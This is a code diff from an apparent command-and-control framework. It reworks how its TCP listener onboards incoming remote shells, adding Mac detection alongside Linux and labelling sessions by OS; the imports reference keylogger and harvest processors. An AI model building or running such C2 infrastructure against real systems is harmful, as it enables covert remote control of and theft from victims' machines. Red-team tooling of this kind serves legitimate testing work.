@@ -19,12 +19,11 @@ import c2.HarvestProcessor;
 import c2.KeyloggerProcessor;
 import c2.session.IOManager;
 import util.Time;
+import util.test.TestConfiguration;
+import util.test.TestConfiguration.OS;
 
 public class GenericTCPInitiator extends C2Interface {
-	public enum OS {
-		WINDOWS, LINUX
-	};
-
+	
 	private IOManager ioManager;
 	private int port;
 	private boolean stayAlive = true;
@@ -133,11 +132,15 @@ public class GenericTCPInitiator extends C2Interface {
 
 						Time.sleepWrapped(Constants.getConstants().getTextOverTCPStaticWait());
 						String resp = readUnknownLinesFromSocket(br, newSession, false);
+						System.out.println("Received: " + resp);
+						TestConfiguration.OS osEn = null;
 						if (resp.contains("Linux")) {
-							System.out.println("Onboarding Linux native shell");
-							LinuxSocketReader lsr = new LinuxSocketReader(newSession, br, initialBanner.contains("$"));
-							onboardLinux(bw, newSession, lsr);
+							osEn = TestConfiguration.OS.LINUX;
+						}else {
+							osEn = TestConfiguration.OS.MAC;
 						}
+						NixSocketReader lsr = new NixSocketReader(newSession, br, initialBanner.contains("$"));
+						onboardNix(bw, newSession, lsr, osEn);
 					}
 
 					/*
@@ -161,7 +164,7 @@ public class GenericTCPInitiator extends C2Interface {
 		}
 	}
 
-	private void onboardLinux(OutputStreamWriter bw, Socket s, LinuxSocketReader lsr) throws IOException {
+	private void onboardNix(OutputStreamWriter bw, Socket s, NixSocketReader lsr, OS os) throws IOException {
 		bw.write("hostname");
 		bw.write(Constants.NEWLINE);
 		bw.flush();
@@ -178,13 +181,20 @@ public class GenericTCPInitiator extends C2Interface {
 		username = username.replace(System.lineSeparator(), "");
 		username = username.replace(Constants.NEWLINE, "");
 
-		String sessionUID = hostname + ":" + username + ":NativeLinux";
+		String osLabel = null;
+		if(os == OS.LINUX) {
+			osLabel = "NativeLinux";
+		}else {//Mac, Windows can't be here
+			osLabel = "NativeMac";
+		}
+		
+		String sessionUID = hostname + ":" + username + ":" + osLabel;
 		Integer sessionId = ioManager.getSessionId(sessionUID);
 		if (sessionId == null) {
-			sessionId = ioManager.addSession(username, hostname, "NativeLinux");
+			sessionId = ioManager.addSession(username, hostname, osLabel);
 		}
 		TCPShellHandler shellHandler = new TCPShellHandler(ioManager, lsr, s, sessionId, hostname, username, lz,
-				OS.LINUX);
+				os);
 		service.submit(shellHandler);
 	}
 
